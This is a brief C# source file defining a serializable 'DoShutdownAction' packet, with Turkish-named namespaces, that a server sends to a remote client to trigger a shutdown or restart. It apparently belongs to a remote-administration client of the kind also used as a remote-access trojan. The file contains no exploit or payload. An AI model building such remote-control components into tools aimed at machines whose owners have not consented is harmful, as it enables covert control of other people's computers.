using System;
using xClient.KuuhakuÇekirdek.Ağ;
using xClient.Enumlar;

namespace xClient.KuuhakuÇekirdek.Paketler.ServerPaketleri
{
    [Serializable]
    public class DoShutdownAction : IPacket
    {
        public KapatmaEylemleri Action { get; set; }

        public DoShutdownAction()
        {
        }

        public DoShutdownAction(KapatmaEylemleri action)
        {
            this.Action = action;
        }

        public void Execute(Client client)
        {
            client.Send(this);
        }
    }
}